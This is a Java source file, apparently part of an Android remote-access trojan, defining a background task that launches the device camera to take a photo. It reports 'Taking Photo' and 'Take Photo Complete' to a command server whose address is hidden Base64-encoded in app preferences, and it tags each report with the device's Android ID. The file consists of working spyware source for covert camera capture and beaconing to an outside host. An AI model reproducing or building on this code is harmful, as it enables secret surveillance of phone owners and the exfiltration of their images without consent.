package com.asynctask;

import android.content.Intent;
import android.hardware.Camera;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;

import com.connect.CameraView;
import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xff on 2017/12/3.
 */

public class takePhoto extends AsyncTask<String, Void, String> {
    String i = "0";

    public takePhoto(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {
        int numCameras = Camera.getNumberOfCameras();
        if (numCameras > Integer.parseInt(i)) {
            Intent intent = new Intent(MyApplication.getContext(), CameraView.class);
            Log.i("com.connect", "I: " + i);
            intent.putExtra("Camera", i);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            MyApplication.getContext().startActivity(intent);
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {
        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Taking Photo");
        } catch (UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        try {
            String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
            CommonUtils.getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Take Photo Complete");
        } catch (UnsupportedEncodingException e) {

            e.printStackTrace();
        }
    }

    @Override
    protected void onPreExecute() {
        while (PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getBoolean("Media", false) == true) {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putBoolean("Media", true).commit();
    }

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
